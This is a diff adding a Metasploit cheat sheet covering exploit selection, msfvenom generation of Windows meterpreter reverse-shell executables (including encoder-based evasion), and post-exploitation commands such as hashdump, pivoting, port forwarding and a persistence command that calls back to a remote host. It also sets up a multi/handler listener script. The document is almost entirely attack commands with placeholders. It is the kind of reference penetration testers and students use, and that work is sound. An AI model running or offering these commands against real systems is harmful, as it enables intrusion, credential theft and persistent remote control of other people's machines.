@@ -1,0 +1,82 @@
+# Basic Usage
+# Start metasploit console
+msfconsole
+
+# Show all exploits for a vulnerability
+grep <vulnerability> show exploits
+
+# Select an exploit to use
+use <exploit>
+
+# Show current settings for selected exploit
+show options
+
+# Show compatible payloads for selected exploit
+show payloads
+
+# Set the payload for selected exploit
+set payload <payload>
+
+# Set setting for selected exploit 
+set <option> <value>
+
+# Run the exploit
+exploit
+
+# Advanced Usage
+# Search for specific exploits/modules
+search type:exploit platform:windows ms17-010
+
+# Use advanced options
+set ADVANCED true
+show advanced
+
+# Generate shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+
+# Payload Encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe
+
+# Post Exploitation
+# Get system info
+sysinfo
+
+# Dump hashes
+hashdump
+
+# Upload/Download files
+upload <local_file> <remote_destination>
+download <remote_file> <local_destination>
+
+# Port forwarding
+portfwd add -l <local_port> -p <remote_port> -r <remote_host>
+
+# Pivoting
+route add <subnet> <netmask> <session>
+
+# Persistence
+run persistence -X -i 5 -p 443 -r <remote_host>
+
+# Load extensions
+load <extension_name>
+
+# Database Operations
+# Connect to database
+db_connect <username>:<password>@<host>:<port>/<database>
+
+# Import scan results
+db_import <file>
+
+# Show hosts/services
+hosts
+services
+
+# Workspace management
+workspace -a <name>
+workspace <name>
+
+# Resource Scripts
+# Create and run resource scripts
+echo "use exploit/multi/handler" > script.rc
+echo "set payload windows/meterpreter/reverse_tcp" >> script.rc
+resource script.rc
